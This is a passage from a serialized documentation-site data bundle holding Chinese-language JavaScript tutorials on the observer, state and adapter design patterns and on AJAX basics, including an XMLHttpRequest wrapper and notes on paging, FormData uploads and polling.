<title>document</title>\n</head>\n\n<body>\n    <div>\n        <label>用户名称：<input type=\"text\" id=\"pba\" placeholder=\"请输入用户名称\" /></label><br /><br />\n        <label>生成邮箱：<input type=\"text\" id=\"oba\" readonly /></label>\n        <label>生成id：<input type=\"text\" id=\"obb\" readonly /></label>\n    </div>\n\n    <script type=\"text/javascript\">\n        //发布者\n        function publisher(obj) {\n            this.observers = [];\n            var state = obj.value; //让该内容不能直接访问\n\n            //新增两个对于state的操作 获取/更新\n            this.getstate = function() {\n                return state;\n            }\n            this.setstate = function(value) {\n                state = value;\n                this.notice();\n            }\n            this.obj = obj;\n\n        }\n        publisher.prototype.addob = function(observer) {\n            var flag = false;\n            for (var i = this.observers.length - 1; i >= 0; i--) {\n                if (this.observers[i] === observer) {\n                    flag = true;\n                }\n            };\n            if (!flag) {\n                this.observers.push(observer);\n            }\n            return this;\n        }\n        publisher.prototype.removeob = function(observer) {\n            var observers = this.observers;\n            for (var i = 0; i < observers.length; i++) {\n                if (observers[i] === observer) {\n                    observers.splice(i, 1);\n                }\n            };\n            return this;\n        }\n        publisher.prototype.notice = function() {\n            var observers = this.observers;\n            for (var i = 0; i < observers.length; i++) {\n                observers[i].update(this.getstate());\n            };\n        }\n        //订阅者\n        function subscribe(obj) {\n            this.obj = obj;\n            this.update = function(data) {\n                this.obj.value = data;\n            };\n        }\n\n        //实际应用\n        var oba = new subscribe(document.queryselector(\"#oba\")),\n            obb = new subscribe(document.queryselector(\"#obb\"));\n\n        var pba = new publisher(document.queryselector(\"#pba\"));\n\n        pba.addob(oba);\n        pba.addob(obb);\n\n        oba.update = function(state) {\n            this.obj.value = state + \"@w3c.com\";\n        }\n        obb.update = function(state) {\n            this.obj.value = \"id-\" + state;\n        }\n\n        pba.obj.addeventlistener('keyup', function() {\n            pba.setstate(this.value);\n        });\n    <\/script>\n</body>\n\n</html>\n\n\n\n# 状态模式\n\n> 状态模式的关键是区分事物内部的状态，事物内部状态的改变往往会带来事物的行为改变。\n\n通常我们谈到封装，一般都会优先封装对象的行为，而不是对象的状态。但在状态模式中刚好相反，状态模式的关键是把事物的每种状态都封装成单独的类，跟此种状态有关的行为都被封装在这个类的内部\n\n\n# 简单的案例\n\n> 开关重复按下后的逻辑为 弱光--\x3e强光--\x3e关灯--\x3e弱光\n\n// offlightstate：\nvar offlightstate = function(light) {\n    this.light = light;\n};\nofflightstate.prototype.buttonwaspressed = function() {\n    console.log('弱光'); // offlightstate 对应的行为\n    this.light.setstate(this.light.weaklightstate); // 切换状态到 weaklightstate \n};\n// weaklightstate：\nvar weaklightstate = function(light) {\n    this.light = light;\n};\nweaklightstate.prototype.buttonwaspressed = function() {\n    console.log('强光'); // weaklightstate 对应的行为\n    this.light.setstate(this.light.stronglightstate); // 切换状态到 stronglightstate \n};\n// stronglightstate：\nvar stronglightstate = function(light) {\n    this.light = light;\n};\nstronglightstate.prototype.buttonwaspressed = function() {\n    console.log('关灯'); // stronglightstate 对应的行为\n    this.light.setstate(this.light.offlightstate); // 切换状态到 offlightstate \n};\n\nvar light = function() {\n    this.offlightstate = new offlightstate(this);\n    this.weaklightstate = new weaklightstate(this);\n    this.stronglightstate = new stronglightstate(this);\n    this.button = null;\n};\n//  button 按钮被按下的事件里，context 也不再直接进行任何实质性的操作，而是通过self.currstate.buttonwaspressed()将请求委托给当前持有的状态对象去执行，代码如下：\nlight.prototype.init = function() {\n    var button = document.createelement('button'),\n        self = this;\n    this.button = document.body.appendchild(button);\n    this.button.innerhtml = '开关';\n    this.currstate = this.offlightstate; // 设置当前状态\n    this.button.onclick = function() {\n        self.currstate.buttonwaspressed();\n    }\n};\n// light.prototype.setstate 方法，状态对象可以通过这个方法来切换 light对象的状态\nlight.prototype.setstate = function(newstate) {\n    this.currstate = newstate;\n};\nvar light = new light();\nlight.init();\n\n\n\n# 状态模式的定义\n\n> 允许一个对象在其内部状态改变时改变它的行为，对象看起来似乎修改了它的类。\n\n * 我们以逗号分割，把这句话分为两部分来看。第一部分的意思是将状态封装成独立的类，并 将请求委托给当前的状态对象，当对象的内部状态改变时，会带来不同的行为变化。电灯的例子 足以说明这一点，在 off 和 on 这两种不同的状态下，我们点击同一个按钮，得到的行为反馈是截 然不同的。\n * 第二部分是从客户的角度来看，我们使用的对象，在不同的状态下具有截然不同的行为，这 个对象看起来是从不同的类中实例化而来的，实际上这是使用了委托的效果。\n\n\n# 状态模式的通用结构\n\n * 一个上下文的类（context）（类似于上述代码的 light 类）\n * light 的构造函数中，我们要创建每一个状态类的实例对象，context 将持有这些状态对象的引用，以便把请求委托给状态对象。\n\n\n# 状态模式的优缺点\n\n# 优点\n\n * 状态模式定义了状态与行为之间的关系，并将它们封装在一个类里。通过增加新的状态 类，很容易增加新的状态和转换。\n * 避免 context 无限膨胀，状态切换的逻辑被分布在状态类中，也去掉了 context 中原本过 多的条件分支\n * 用对象代替字符串来记录当前状态，使得状态的切换更加一目了然。\n * context 中的请求动作和状态类中封装的行为可以非常容易地独立变化而互不影响。\n\n# 缺点\n\n * 中定义许多状态类\n * 逻辑分散在状态类中 无法在一个地方就看出整个状态机的逻辑。\n\n\n# 状态模式和策略模式的关系\n\n * 状态模式和策略模式像一对双胞胎，它们都封装了一系列的算法或者行为，它们的类图看起来几乎一模一样，但在意图上有很大不同，因此它们是两种迥然不同的式。\n * 策略模式和状态模式的相同点是，它们都有一个上下文、一些策略或者状态类，上下文把请求委托给这些类来执行。\n\n\n# 适配器模式\n\n> 适配器模式的作用是解决两个软件实体间的接口不兼容的问题。使用适配器模式之后，原本由于接口不兼容而不能工作的两个软件实体可以一起工作。\n\n当我们试图调用模块或者对象的某个接口时，却发现这个接口的格式并不符合目前的需求。 这时候有两种解决办法，第一种是修改原来的接口实现，但如果原来的模块很复杂，或者我们拿 到的模块是一段别人编写的经过压缩的代码，修改原接口就显得不太现实了。第二种办法是创建 一个适配器，将原接口转换为客户希望的另一个接口，客户只需要和适配器打交道。\n\n如果现有的接口已经能够正常工作，那我们就永远不会用上适配器模式。适配器模式是一种 “亡羊补牢”的模式，没有人会在程序的设计之初就使用它。因为没有人可以完全预料到未来的 事情，也许现在好好工作的接口，未来的某天却不再适用于新系统，那么我们可以用适配器模式 把旧接口包装成一个新的接口，使它继续保持生命力。\n\n\n# 总结\n\n * 适配器模式主要用来解决两个已有接口之间不匹配的问题，它不考虑这些接口是怎样实 现的，也不考虑它们将来可能会如何演化。适配器模式不需要改变已有的接口，就能够 使它们协同作用。\n\n * 装饰者模式和代理模式也不会改变原有对象的接口，但装饰者模式的作用是为了给对象 增加功能。装饰者模式常常形成一条长的装饰链，而适配器模式通常只包装一次。代理 模式是为了控制对对象的访问，通常也只包装一次。",charsets:{cjk:!0}},{title:"AJAX",frontmatter:{},regularPath:"/Javascript/Javascript%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86/Ajax/ajax%E7%9A%84%E7%AE%80%E4%BB%8B%E5%92%8C%E4%BD%BF%E7%94%A8.html",relativePath:"Javascript/Javascript数据处理/Ajax/ajax的简介和使用.md",key:"v-5402d2f3",path:"/Javascript/Javascript%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86/Ajax/ajax%E7%9A%84%E7%AE%80%E4%BB%8B%E5%92%8C%E4%BD%BF%E7%94%A8.html",headers:[{level:2,title:"什么是Ajax",slug:"什么是ajax",normalizedTitle:"什么是ajax",charIndex:131},{level:2,title:"用来做什么",slug:"用来做什么",normalizedTitle:"用来做什么",charIndex:486},{level:2,title:"Aajx原理",slug:"aajx原理",normalizedTitle:"aajx原理",charIndex:588},{level:2,title:"应用场景",slug:"应用场景",normalizedTitle:"应用场景",charIndex:832},{level:2,title:"Ajax使用方法",slug:"ajax使用方法",normalizedTitle:"ajax使用方法",charIndex:926},{level:3,title:"1. 实例化ajax对象",slug:"_1-实例化ajax对象",normalizedTitle:"1. 实例化ajax对象",charIndex:941},{level:3,title:"2. open() 用于配置请求",slug:"_2-open-用于配置请求",normalizedTitle:"2. open() 用于配置请求",charIndex:1042},{level:3,title:"3. send() 用于发送请求",slug:"_3-send-用于发送请求",normalizedTitle:"3. send() 用于发送请求",charIndex:1398},{level:3,title:"4. onreadystatechange",slug:"_4-onreadystatechange",normalizedTitle:"4. onreadystatechange",charIndex:1777},{level:3,title:"5. status",slug:"_5-status",normalizedTitle:"5. status",charIndex:1998},{level:2,title:"get和post的区别",slug:"get和post的区别",normalizedTitle:"get和post的区别",charIndex:3040}],headersStr:"什么是Ajax 用来做什么 Aajx原理 应用场景 Ajax使用方法 1. 实例化ajax对象 2. open() 用于配置请求 3. send() 用于发送请求 4. onreadystatechange 5. status get和post的区别",content:'# AJAX\n\n> Ajax是一种创建交互式网页应用的网页开发技术,当需要从服务器获取数据，并刷新页面的操作，如果不采用AJAX，则需要用提交整个表单的方式，当提交表单时，发送请求给服务器，页面需要等待服务器发送完response后，页面才能恢复操作。\n\n\n# 什么是Ajax\n\n> 而Ajax是一种用于创建快速动态网页的技术。通过在后台与服务器进行少量数据交换，可以使网页实现异步更新。可以在不重新加载整个网页的情况下，对网页的某部分进行更新。\n\nAJAX 是异步的JavaScript和XML（Asynchronous JavaScript And XML）。简单点说，就是使用 XMLHttpRequest 对象与服务器通信\n\n它可以使用JSON，XML，HTML和文本等多种格式发送和接收。\n\nAJAX最吸引人的就是它的“异步”特性，也就是说AJAX可以在不重新加载整个页面的情况下，与服务器交换数据。这种异步交互的方式，使用户单击后，不必刷新页面也能获取新数据。使用Ajax，用户可以创建接近本地桌面应用的直接、高可用、更丰富、更动态的Web用户界面。\n\n\n# 用来做什么\n\n> Ajax的唯一功能：发送数据和接收数据\n\n你可以使用AJAX最主要的两个特性做下列事：\n\n * 在不重新加载页面的情况下发送请求给服务器。\n * 接受并使用从服务器发来的数据。\n\n\n# Aajx原理\n\nAjax的工作原理相当于在用户和服务器之间加了—个中间层(AJAX引擎),使用户操作与服务器响应异步化。并不是所有的用户请求都提交给服务器,像—些数据验证和数据处理等都交给Ajax引擎自己来做, 只有确定需要从服务器读取新数据时再由Ajax引擎代为向服务器提交请求。\n\nAjax是告诉浏览器给我要发送一个HTTP请求，你给我新开个线程去执行下，完事后告诉我一声，我在其他function中执行后续操作（回调）。在线程返回结果前，我可以继续做其他事情。（异步）\n\n\n\n\n# 应用场景\n\n 1. 对数据进行过滤和操纵相关数据的场景\n 2. 添加/删除树节点\n 3. 添加/删除列表中的某一行记录\n 4. 切换下拉列表item\n 5. 注册用户名重名的校验\n\n\n# Ajax使用方法\n\n\n\n\n# 1. 实例化ajax对象\n\nvar xhr = new XMLHttpRequest();\n\n\nHEADER ONE   HEADER TWO\nxhr.abort    取消ajax请求的方法\n\n\n# 2. open() 用于配置请求\n\n参数             值\nrequest-type   发送请求的类型,典型的值是 GET 或 POST，默认为GET\nurl            要连接的 URL\nasynch         如果希望使用异步连接则为 true，否则为 false。该参数是可选的，默认为 true\nusername       如果需要身份验证，则可以在此指定用户名。该可选参数没有默认值\npassword       如果需要身份验证，则可以在此指定口令。该可选参数没有默认值\n\n>  * 同步：提交请求->等待服务器处理->处理完毕返回 这个期间客户端浏览器不能干任何事\n>  * 异步: 请求通过事件触发->服务器处理（这是浏览器仍然可以作其他事情）->处理完毕\n\n\n# 3. send() 用于发送请求\n\n * GET方式：如果不需要通过 send() 传递数据，则只要传递 null 作为该方法的参数即可，将传递的数据放在url地址后面进行传递。\n * POST方式：需要先设置请求头信息，然后将需要发送的数据放到send()的参数中进行发送。 (注：头部的设置必须在open()和send()之间)\n\n// GET方式：\nxhr.open(url+\'?name=zhangsan&pwd=123456\')\nxhr.send(null);\n\n// POST方式：\nxhr.open(url)\nxhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");\nxhr.send(\'name=zhangsan&pwd=123456\');\n\n\n\n# 4. onreadystatechange\n\n * 每次Ajax请求状态改变时都会触发这个事件\n * readyState： 请求的状态。有5个可取值\n\n值   含义\n0   （未初始化）还没有调用send()方法\n1   （正在载入）已调用send()方法，正在发送请求\n2   （载入完成）send()方法执行完成，已经接收到全部响应内容\n3   （交互中）正在解析响应内容\n4   （完成）响应内容解析完成，可以在客户端调用了\n\n\n# 5. status\n\n当readyState 的值为4的时候，说明我们和服务器的交互是成功的，但是如何判断页面返回的数据是成功的呢？我们需要再来检测一下服务器的HTTP状态码，状态码保存在一个属性status上\n\n值     含义\n200   OK 一切正常\n304   Not Modified\n      客户端有缓冲的文档并发出了一个条件性的请求（一般是提供If-Modified-Since头表示客户只想比指定日期更新的文档）。服务器告诉客户，原来缓冲的文档还可以继续使用\n404   Not Found 无法找到指定位置的资源\n5xx   服务器错误\n\nHTTP状态码详解\n\n 1. 响应\n    \n    * response 响应实体的类型由 responseType 来指定， 可以是 ArrayBuffer， Blob， Document， JavaScript 对象 (即 "json")， 或者是字符串。如果请求未完成或失败，则该值为 null。\n    * responesType 设置该值能够改变响应类型。就是告诉服务器你期望的响应格式。\n    * responseText 此次请求的响应为文本，或是当请求未成功或还未发送时为 null。\n    * responseXML 本次请求的响应是一个 Document 对象，如果是以下情况则值为 null：请求未成功，请求未发送，或响应无法被解析成 XML 或 HTML。当响应为text/xml 流时会被解析。\n\n 2. upload 可以在 upload 上添加一个事件监听来跟踪上传过程。\n\n> ajax对象和upload对象拥有相同的事件\n\n事件            含义\nonabort       当发生中止事件时触发的事件\nonerror       当发生加载错误是触发的事件\nonload        当加载结束后触发的事件，不论成功与否\nonloadend     加载结束后触发的事件\nonloadstart   当加载开始时触发的事件\nonprogress    在加载过程中不断触发的事件\nontimeout     加载超时后执行的事件\n\n xhr.upload.onprogress=function(e){\n //获取当前上传进度传递到progress中显示\n progress.value=parseInt(e.loaded/e.total*100)\n}\n\n\n\n# get和post的区别\n\n * 功能\n   * get是从服务器上获取数据 (查)\n   * post是向服务器传送数据，用于创建资源 (增)\n * 数据量\n   * get受限于浏览器url长度，IE对URL长度的限制是2083字节(2K+35)，其他浏览器的限制取决于操作系统的支持\n   * post传送的数据量较大，一般被默认为不受限制\n * 安全性\n   * GET方式请求的数据会被浏览器缓存起来，因此其他人就可以从浏览器的历史记录中读取到这些数据，例如账号和密码等。\n   * POST方式相对来说就可以避免这些问题。\n\n若符合下列任一情况，则用POST方法：\n\n * 请求的结果有持续性的副作用，例如，数据库内添加新的数据行。\n * 若使用GET方法，则表单上收集的数据可能让URL过长。\n * 要传送的数据不是采用7位的ASCII编码。\n\n若符合下列任一情况，则用GET方法：\n\n * 请求是为了查找资源，HTML表单数据仅用来帮助搜索。\n * 请求结果无持续性的副作用，如进行搜索。\n * 收集的数据及HTML表单内的输入字段名称的总长不超过1024个字符。',normalizedContent:'# ajax\n\n> ajax是一种创建交互式网页应用的网页开发技术,当需要从服务器获取数据，并刷新页面的操作，如果不采用ajax，则需要用提交整个表单的方式，当提交表单时，发送请求给服务器，页面需要等待服务器发送完response后，页面才能恢复操作。\n\n\n# 什么是ajax\n\n> 而ajax是一种用于创建快速动态网页的技术。通过在后台与服务器进行少量数据交换，可以使网页实现异步更新。可以在不重新加载整个网页的情况下，对网页的某部分进行更新。\n\najax 是异步的javascript和xml（asynchronous javascript and xml）。简单点说，就是使用 xmlhttprequest 对象与服务器通信\n\n它可以使用json，xml，html和文本等多种格式发送和接收。\n\najax最吸引人的就是它的“异步”特性，也就是说ajax可以在不重新加载整个页面的情况下，与服务器交换数据。这种异步交互的方式，使用户单击后，不必刷新页面也能获取新数据。使用ajax，用户可以创建接近本地桌面应用的直接、高可用、更丰富、更动态的web用户界面。\n\n\n# 用来做什么\n\n> ajax的唯一功能：发送数据和接收数据\n\n你可以使用ajax最主要的两个特性做下列事：\n\n * 在不重新加载页面的情况下发送请求给服务器。\n * 接受并使用从服务器发来的数据。\n\n\n# aajx原理\n\najax的工作原理相当于在用户和服务器之间加了—个中间层(ajax引擎),使用户操作与服务器响应异步化。并不是所有的用户请求都提交给服务器,像—些数据验证和数据处理等都交给ajax引擎自己来做, 只有确定需要从服务器读取新数据时再由ajax引擎代为向服务器提交请求。\n\najax是告诉浏览器给我要发送一个http请求，你给我新开个线程去执行下，完事后告诉我一声，我在其他function中执行后续操作（回调）。在线程返回结果前，我可以继续做其他事情。（异步）\n\n\n\n\n# 应用场景\n\n 1. 对数据进行过滤和操纵相关数据的场景\n 2. 添加/删除树节点\n 3. 添加/删除列表中的某一行记录\n 4. 切换下拉列表item\n 5. 注册用户名重名的校验\n\n\n# ajax使用方法\n\n\n\n\n# 1. 实例化ajax对象\n\nvar xhr = new xmlhttprequest();\n\n\nheader one   header two\nxhr.abort    取消ajax请求的方法\n\n\n# 2. open() 用于配置请求\n\n参数             值\nrequest-type   发送请求的类型,典型的值是 get 或 post，默认为get\nurl            要连接的 url\nasynch         如果希望使用异步连接则为 true，否则为 false。该参数是可选的，默认为 true\nusername       如果需要身份验证，则可以在此指定用户名。该可选参数没有默认值\npassword       如果需要身份验证，则可以在此指定口令。该可选参数没有默认值\n\n>  * 同步：提交请求->等待服务器处理->处理完毕返回 这个期间客户端浏览器不能干任何事\n>  * 异步: 请求通过事件触发->服务器处理（这是浏览器仍然可以作其他事情）->处理完毕\n\n\n# 3. send() 用于发送请求\n\n * get方式：如果不需要通过 send() 传递数据，则只要传递 null 作为该方法的参数即可，将传递的数据放在url地址后面进行传递。\n * post方式：需要先设置请求头信息，然后将需要发送的数据放到send()的参数中进行发送。 (注：头部的设置必须在open()和send()之间)\n\n// get方式：\nxhr.open(url+\'?name=zhangsan&pwd=123456\')\nxhr.send(null);\n\n// post方式：\nxhr.open(url)\nxhr.setrequestheader("content-type","application/x-www-form-urlencoded");\nxhr.send(\'name=zhangsan&pwd=123456\');\n\n\n\n# 4. onreadystatechange\n\n * 每次ajax请求状态改变时都会触发这个事件\n * readystate： 请求的状态。有5个可取值\n\n值   含义\n0   （未初始化）还没有调用send()方法\n1   （正在载入）已调用send()方法，正在发送请求\n2   （载入完成）send()方法执行完成，已经接收到全部响应内容\n3   （交互中）正在解析响应内容\n4   （完成）响应内容解析完成，可以在客户端调用了\n\n\n# 5. status\n\n当readystate 的值为4的时候，说明我们和服务器的交互是成功的，但是如何判断页面返回的数据是成功的呢？我们需要再来检测一下服务器的http状态码，状态码保存在一个属性status上\n\n值     含义\n200   ok 一切正常\n304   not modified\n      客户端有缓冲的文档并发出了一个条件性的请求（一般是提供if-modified-since头表示客户只想比指定日期更新的文档）。服务器告诉客户，原来缓冲的文档还可以继续使用\n404   not found 无法找到指定位置的资源\n5xx   服务器错误\n\nhttp状态码详解\n\n 1. 响应\n    \n    * response 响应实体的类型由 responsetype 来指定， 可以是 arraybuffer， blob， document， javascript 对象 (即 "json")， 或者是字符串。如果请求未完成或失败，则该值为 null。\n    * responestype 设置该值能够改变响应类型。就是告诉服务器你期望的响应格式。\n    * responsetext 此次请求的响应为文本，或是当请求未成功或还未发送时为 null。\n    * responsexml 本次请求的响应是一个 document 对象，如果是以下情况则值为 null：请求未成功，请求未发送，或响应无法被解析成 xml 或 html。当响应为text/xml 流时会被解析。\n\n 2. upload 可以在 upload 上添加一个事件监听来跟踪上传过程。\n\n> ajax对象和upload对象拥有相同的事件\n\n事件            含义\nonabort       当发生中止事件时触发的事件\nonerror       当发生加载错误是触发的事件\nonload        当加载结束后触发的事件，不论成功与否\nonloadend     加载结束后触发的事件\nonloadstart   当加载开始时触发的事件\nonprogress    在加载过程中不断触发的事件\nontimeout     加载超时后执行的事件\n\n xhr.upload.onprogress=function(e){\n //获取当前上传进度传递到progress中显示\n progress.value=parseint(e.loaded/e.total*100)\n}\n\n\n\n# get和post的区别\n\n * 功能\n   * get是从服务器上获取数据 (查)\n   * post是向服务器传送数据，用于创建资源 (增)\n * 数据量\n   * get受限于浏览器url长度，ie对url长度的限制是2083字节(2k+35)，其他浏览器的限制取决于操作系统的支持\n   * post传送的数据量较大，一般被默认为不受限制\n * 安全性\n   * get方式请求的数据会被浏览器缓存起来，因此其他人就可以从浏览器的历史记录中读取到这些数据，例如账号和密码等。\n   * post方式相对来说就可以避免这些问题。\n\n若符合下列任一情况，则用post方法：\n\n * 请求的结果有持续性的副作用，例如，数据库内添加新的数据行。\n * 若使用get方法，则表单上收集的数据可能让url过长。\n * 要传送的数据不是采用7位的ascii编码。\n\n若符合下列任一情况，则用get方法：\n\n * 请求是为了查找资源，html表单数据仅用来帮助搜索。\n * 请求结果无持续性的副作用，如进行搜索。\n * 收集的数据及html表单内的输入字段名称的总长不超过1024个字符。',charsets:{cjk:!0}},{title:"Ajax 封装",frontmatter:{},regularPath:"/Javascript/Javascript%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86/Ajax/ajax%E7%9A%84%E5%B0%81%E8%A3%85%E6%A1%88%E4%BE%8B.html",relativePath:"Javascript/Javascript数据处理/Ajax/ajax的封装案例.md",key:"v-031f061b",path:"/Javascript/Javascript%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86/Ajax/ajax%E7%9A%84%E5%B0%81%E8%A3%85%E6%A1%88%E4%BE%8B.html",headers:[{level:2,title:"Ajax 封装",slug:"ajax-封装",normalizedTitle:"ajax 封装",charIndex:2},{level:2,title:"ajax大规模数据处理",slug:"ajax大规模数据处理",normalizedTitle:"ajax大规模数据处理",charIndex:2079},{level:3,title:"1. 数据分页",slug:"_1-数据分页",normalizedTitle:"1. 数据分页",charIndex:2196},{level:3,title:"2. 分批次请求",slug:"_2-分批次请求",normalizedTitle:"2. 分批次请求",charIndex:2700},{level:2,title:"文件上传",slug:"文件上传",normalizedTitle:"文件上传",charIndex:2863},{level:3,title:"1. form文件上传",slug:"_1-form文件上传",normalizedTitle:"1. form文件上传",charIndex:2872},{level:3,title:"2. Ajax上传文件",slug:"_2-ajax上传文件",normalizedTitle:"2. ajax上传文件",charIndex:3238},{level:2,title:"轮询",slug:"轮询",normalizedTitle:"轮询",charIndex:4481}],headersStr:"Ajax 封装 ajax大规模数据处理 1. 数据分页 2. 分批次请求 文件上传 1. form文件上传 2. Ajax上传文件 轮询",content:'# Ajax 封装\n\n// 兼容实例化一个ajax对象\nfunction newAjax(){\n    var xhr = window.XMLHttpRequest?new XMLHttpRequest():new ActiveXObject("Miscrosoft.XMLHTTP")\n    return xhr;\n}\n\n//ajax函数\n  //1. type:方式 "get" "post"\n  //2. url:地址 url "demo.php"\n  //3.data:数据  "id=0&name=zhangsan"\n  //4.asynch:是否异步  true  false\n  //5.dataType:返回数据的格式 "text" "json" "xml"\n  //6.success返回数据之后进行的操作  function(){}\nfunction ajax(options){\n    //没有url 直接退出\n    if(!options.url){\n        alert(\'请输入URL\');\n        return;\n    }\n    var type = options.type || \'GET\';\n    var async = options.async==undefined?true:options.async;\n    var dataType = options.dataType || \'text\';\n    var dataStr = "";\n    if(options.data){\n        if(typeof options.data==\'string\'){\n            dataStr = options.data;\n        }else{\n            //{user:123,pwd:456}\n            for(var i in options.data){\n                 dataStr+= i+\'=\'+options.data[i]+\'&\'\n                //user=123&pwd=456&\n            }\n            dataStr = dataStr.slice(0,-1)\n        }\n    }\n    //dataStr = "user=123&pwd=456"\n\n    var xhr = new XMLHttpRequest();\n\n    if(type.toUpperCase() ==\'GET\'){\n        if(dataStr){\n            xhr.open(\'GET\',options.url+\'?\'+dataStr,async);\n        }else{\n            xhr.open(\'GET\',options.url,async);\n        }\n        xhr.send();\n    }\n    if(type.toUpperCase() ==\'POST\'){\n        xhr.open(\'POST\',options.url,async);\n        xhr.setRequestHeader(\'Content-Type\',\'application/x-www-form-urlencoded;charset=utf-8\');\n        xhr.send(dataStr);\n    }\n    xhr.onreadystatechange = function(){\n        if(xhr.readyState==4){\n            if(xhr.status==200){\n                if(dataType==\'text\'){\n                    options.success&&options.success(xhr.response);\n                }else if(dataType==\'xml\'){\n                    options.success&&options.success(xhr.responseXML);\n                }else if(dataType==\'json\'){\n                    options.success&&options.success(JSON.parse(xhr.response));\n                }\n            }else if(xhr.status ==404){\n                alert(\'请求失败\');\n            }\n        }\n    }\n}\n\n\n\n# ajax大规模数据处理\n\n> 假设ajax要请求一条长度10000的数据并渲染,首先由于数据量大ajax请求花费事件会很长,并且前台在处理该数据时也会花费大量事件导致页面长时间留白。所以在请求大规模数据时有以下几种处理方法：\n\n\n# 1. 数据分页\n\n将大量的数据进行分页展示，每次只获取当前页的数据，则数据的请求和处理会更快。\n\n所以在发送ajax请求时就需要携带分页的参数，一个分页器一般包含数据总条数、总页数、当前页码、每页数据条数等数据。其中当前页码、每页条数需要在发送请求时携带，每当切换页码时重新携带当前页码和每页条数发送请求。\n\n而后台需要返回当前页数据，以及数据总条数，前台即可根据数据总条数及每页数据条数计算出总页数进行页面渲染。\n\nvar currentPage = 2,   // 当前页码\n    pageSize = 20;     // 每页数据条数   \najax({\n    url: "",\n    data:{\n        currentPage,  \n        pageSize,   \n    },\n    success(data){\n        var pageCount = Math.ceil(data.total / pageSize)   // 总数据条数total / 每页数据数pageSize   向上取整，即可求出总页数pageCount\n    }\n})\n\n\n\n# 2. 分批次请求\n\n当前台不能进行分页时，大规模数据的请求可采用分批次的请求。如10000条数据，第一次请求100条数据（这样用户就很快看到有页面出来），剩余的数据，通过ajax分多次请求给客户端。（这里相当于：用户的一个请求结果，被切割成多次请求来完成）\n\n例如先展示100条数据，剩余数据按需(上拉或者触底)加载\n\n\n# 文件上传\n\n\n# 1. form文件上传\n\n> 上传图片必须为POST方式，并且设置编码方式enctype="multipart/form-data"，否则会默认对文件进行编码则无法使用\n> enctype这个属性管理的是表单的MIME编码，有三个值，默认为application/x-www-form-urlencoded，是传递html代码的编码类型。text/plain,是纯文本传输的意思。multipart/form-data,是用来指定传输数据的特殊类型的，主要就是我们上传的非文本的内容，比如图片或者mp3等等。\n\n<form action="" method="POST" enctype="multipart/form-data">\n    <input type="file" name="file">\n</form>\n\n\n\n# 2. Ajax上传文件\n\n> Ajax上传文件需要依靠表单对象FormData，在表单对象中添加数据进行上传\n\n表单对象FormData的作用\n\n * 将form表单元素的name与value进行组合，实现表单数据的序列化，从而减少表单元素的拼接，提高工作效率。\n * 异步上传文件\n   兼容性：Chrome 7+、Firefox 4+、IE 10+、Opera 12+、Safari 5+。\n\n# formData对象\n\n实例化formData，来得到这个对象\n\n参数为form，一个HTML表单元素，可以包含任何形式的表单控件，包括文件输入框，是一个可选参数\n\nvar formData = new FormData();   \n\n\n通过HTML表单创建FormData对象\n\nvar formData = new FormData(document.querySelector("form"));   //包含了form表单里的数据\n\n\n# 方法\n\n * 通过append(name,value,filename)在数据末尾追加数据，参数值有三个,第三个为可选参数\n\nformdata.append("name","laoliu");   //通过append()方法在末尾追加key为name值为laoliu的数据\n\n\n * 通过get(name)来获取相对应的值\n\n// 获取key为age的值\nformdata.get("age");\n\n\n * 通过set(key, value)来设置修改数据（key的值不存在，会添加一条数据）\n\nformdata.set("name","laoli");     \n\n\n * 通过has(key)来判断是否存在对应的key值 返回一个布尔值\n\nformdata.has("name")     \n\n\n * 通过delete(key)可以删除数据\n\n//删除key为name的值\nformdata.delete("name");\n\n\n# Ajax+FormData对象上传文件\n\nvar fileTag = document.querySelector("input[type=file]");\n file.onchange=function(){\n    // 图片会保存到 标签的files属性中，并且可读取文件的名称、大小等信息\n    var fd = new FormData();\n    // 添加图片，字段名叫 files\n    fd.append(\'files\', fileTag.files[0]);\n    // 添加普通字段\n    fd.append("user", "zhangsan");\n    fd.append("age", 22); //数字22会被立即转换成字符串 "22"\n    // ...ajax代码\n    xhr.send(fd)\n    // ...ajax代码\n }\n\n\n\n# 轮询\n\n> 原理： 每隔一段时间执行ajax请求，获取实时数据\n\n例：访问实时金价、实时停车等数据\n\n实现方式：在时间函数setInterval中进行ajax请求',normalizedContent:'# ajax 封装\n\n// 兼容实例化一个ajax对象\nfunction newajax(){\n    var xhr = window.xmlhttprequest?new xmlhttprequest():new activexobject("miscrosoft.xmlhttp")\n    return xhr;\n}\n\n//ajax函数\n  //1. type:方式 "get" "post"\n  //2. url:地址 url "demo.php"\n  //3.data:数据  "id=0&name=zhangsan"\n  //4.asynch:是否异步  true  false\n  //5.datatype:返回数据的格式 "text" "json" "xml"\n  //6.success返回数据之后进行的操作  function(){}\nfunction ajax(options){\n    //没有url 直接退出\n    if(!options.url){\n        alert(\'请输入url\');\n        return;\n    }\n    var type = options.type || \'get\';\n    var async = options.async==undefined?true:options.async;\n    var datatype = options.datatype || \'text\';\n    var datastr = "";\n    if(options.data){\n        if(typeof options.data==\'string\'){\n            datastr = options.data;\n        }else{\n            //{user:123,pwd:456}\n            for(var i in options.data){\n                 datastr+= i+\'=\'+options.data[i]+\'&\'\n                //user=123&pwd=456&\n            }\n            datastr = datastr.slice(0,-1)\n        }\n    }\n    //datastr = "user=123&pwd=456"\n\n    var xhr = new xmlhttprequest();\n\n    if(type.touppercase() ==\'get\'){\n        if(datastr){\n            xhr.open(\'get\',options.url+\'?\'+datastr,async);\n        }else{\n            xhr.open(\'get\',options.url,async);\n        }\n        xhr.send();\n    }\n    if(type.touppercase() ==\'post\'){\n        xhr.open(\'post\',options.url,async);\n        xhr.setrequestheader(\'content-type\',\'application/x-www-form-urlencoded;charset=utf-8\');\n        xhr.send(datastr);\n    }\n    xhr.onreadystatechange = function(){\n        if(xhr.readystate==4){\n            if(xhr.status==200){\n                if(datatype==\'text\'){\n                    options.success&&options.success(xhr.response);\n                }else if(datatype==\'xml\'){\n                    options.success&&options.success(xhr.responsexml);\n                }else if(datatype==\'json\'){\n                    options.success&&options.success(json.parse(xhr.response));\n                }\n            }else if(xhr.status ==404){\n                alert(\'请求失败\');\n            }\n        }\n    }\n}\n\n\n\n# ajax大规模数据处理\n\n> 